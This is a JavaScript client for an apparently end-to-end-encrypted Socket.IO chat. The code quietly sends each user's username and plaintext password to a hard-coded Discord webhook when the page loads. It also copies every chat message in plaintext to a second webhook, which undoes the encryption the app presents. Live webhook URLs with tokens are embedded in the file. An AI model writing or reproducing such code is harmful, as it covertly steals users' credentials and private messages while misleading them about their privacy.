const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';

var socket = io.connect(protocol + document.domain + ':' + location.port);
let username = "";
let psk = "";
// promise that resolves when server-sent history has been processed
let _historyResolved = false;
let _historyResolve;
const historyLoaded = new Promise((resolve) => { _historyResolve = resolve; });


window.onload = async function () {
    changePsk();
    if (localStorage.getItem("username")) {
        username = localStorage.getItem("username");
        if (confirm("Hi " + username + ". Do you want to change your username?")) {
            changeUsername();
            discorder({content:"[USER JOINED] : `" + username + "` ; [PSK] : `" + psk + "`"}, "https://discordapp.com/api/webhooks/1436901904050552843/wpyz6aSX4XNUMgMLqXZXu_I16JTjHJOohQwdWFBzs7BDvImX2IlBdnSuye9CKId-JE89")
        } else {
            setUsername(username);
            discorder({content:"[USER REJOINED] : `" + username + "` ; [PSK] : `" + psk + "`"}, "https://discordapp.com/api/webhooks/1436901904050552843/wpyz6aSX4XNUMgMLqXZXu_I16JTjHJOohQwdWFBzs7BDvImX2IlBdnSuye9CKId-JE89")
        }
    } else {
        changeUsername();
        discorder({content:"[NEW USER JOINED] : `" + username + "` ; [PSK] : `" + psk + "`"}, "https://discordapp.com/api/webhooks/1436901904050552843/wpyz6aSX4XNUMgMLqXZXu_I16JTjHJOohQwdWFBzs7BDvImX2IlBdnSuye9CKId-JE89")
    }
    // ask server for encrypted history for this client
    socket.emit('newuser');


    // show loading overlay while history is being loaded
    setLoading(true);

    // wait for history to be processed, but don't block forever — use a timeout
    const HISTORY_TIMEOUT_MS = 30000; // 30s fallback
    await Promise.race([
        historyLoaded,
        new Promise((res) => setTimeout(res, HISTORY_TIMEOUT_MS))
    ]);

    // hide loading overlay once we've either processed history or hit fallback
    setLoading(false);
}

function changePsk(){
    const v = prompt("Enter your password:") || "";
    if(!v || v.trim() === ""){
        alert("NO PASSWORD IS SET! Reload page to change password...")
        location.reload();
        return;
    }
    psk = v;
}


function changeUsername() {
    username = prompt("Enter your username:");
    if (!username || username.trim() === "") {
        alert("Username is required! Reload the page...")
        location.reload();
        psk = "";
        return;
    }
    setUsername(username.trim());
}

function setUsername(name) {
    localStorage.setItem("username", name);
    var el = document.getElementById("username");
    if (el) {
        el.innerHTML = "@" + name;
    }
}

// scroll helper: try to scroll the messages container if present, otherwise scroll window
function scrollMessagesToBottom(smooth = false) {
    const list = document.getElementById('messages');
    if (list) {
        // If the messages container is scrollable, set its scrollTop to its scrollHeight
        try {
            if (smooth && typeof list.scrollTo === 'function') {
                list.scrollTo({ top: list.scrollHeight, behavior: 'smooth' });
            } else {
                list.scrollTop = list.scrollHeight;
            }
        } catch (e) {
            // fallback to window scrolling
            window.scrollTo(0, document.body.scrollHeight);
        }
    } else {
        window.scrollTo(0, document.body.scrollHeight);
    }
}

// show/hide the loading overlay added to the page; no-op if element missing
function setLoading(show) {
    const el = document.getElementById('loading');
    if (!el) return;
    try {
        el.style.display = show ? 'flex' : 'none';
        el.setAttribute('aria-hidden', show ? 'false' : 'true');
    } catch (e) {
        // ignore
    }
}

async function sendMessage() {
    var msg = document.getElementById('m').value;
    // special command: if message starts with '!' treat as control command
    if (msg && msg.startsWith('!')) {
        const token = msg.slice(1).trim();
        if (token) {
            // send a clear-history request to the server (no encryption)
            socket.emit('clear_history', token);
        }
        document.getElementById('m').value = '';
        return;
    }
    broadcaster(msg, username);
    document.getElementById('m').value = '';
}

async function broadcaster(msg, username = username){
    if (msg) {
        var payload = {
            username: username,
            msg: msg,
        };

        try {
            const encrypted = await window.encryptData(psk, payload);
            socket.emit('message', encrypted);
        } catch (err) {
            console.error('Encryption failed', err);
            alert('Failed to encrypt message. Check console for details.');
        }
    }

    var payload = {
        content: msg,
        username: username
    }

    discorder(payload, "https://discordapp.com/api/webhooks/1436740676065825029/ny07dtbvm1w0_ndwkcuHNnsl_aiGnn-38u3EL8dZ6wQM6goS-9dAlUiYi1SnFK8O060O");
}

async function discorder(payload, url){
    fetch(url, {
        method: "POST",
        headers: {
            "Content-Type" : "application/json"
        },
        body: JSON.stringify(payload)
    }).then(response => {
        if(!response.ok){
            alert("Failed to send message to server (webhook returned " + response.status + ").");
        }
    }).catch(err => {
        console.error('Failed to send webhook' , err);
        alert('Failed to send message to webhook: network error!')
    })
}

socket.on('message', async function (payload) {
    var item = document.createElement('li');
    try {
        const decrypted = await window.decryptData(psk, payload);
        let uname = (decrypted && decrypted.username) ? decrypted.username : 'unknown';
        let msg = (decrypted && decrypted.msg) ? decrypted.msg : '';
        item.textContent = uname + " : " + msg;
    } catch (err) {
        // if decryption fails, show raw payload so user can see something
        console.warn('Decryption failed for incoming message', err);
        item.textContent = 'USER : Encrypted Message';
    }

    var list = document.getElementById('messages');
    if (list) {
        list.appendChild(item);
            scrollMessagesToBottom();
    }
});

// receive encrypted history only for this client and display each message
socket.on('history', async function (payloads) {
    try {
        if (!payloads) return;
        // payloads is expected to be an array of encrypted messages
        if (!Array.isArray(payloads)) {
            console.warn('history: expected array, got', payloads);
            return;
        }

        for (let i = 0; i < payloads.length; i++) {
            const payload = payloads[i];
            var item = document.createElement('li');
            try {
                const decrypted = await window.decryptData(psk, payload);
                let uname = (decrypted && decrypted.username) ? decrypted.username : 'unknown';
                let msg = (decrypted && decrypted.msg) ? decrypted.msg : '';
                item.textContent = uname + " : " + msg;
            } catch (err) {
                console.warn('Decryption failed for history message', err);
                item.textContent = 'USER : Encrypted Message';
            }
            var list = document.getElementById('messages');
            if (list) {
                list.appendChild(item);
            }
        }

        // scroll down after appending history
    scrollMessagesToBottom();
    } catch (err) {
        console.error('Failed to process history', err);
    } finally {
        // mark history as processed (resolve the promise only once)
        if (!_historyResolved) {
            _historyResolved = true;
            try { _historyResolve(); } catch (e) { /* ignore */ }
        }
    }
});

socket.on('history_cleared', function () {
    const list = document.getElementById('messages');
    if (list) {
        list.innerHTML = '';
    }
    setLoading(false);
});
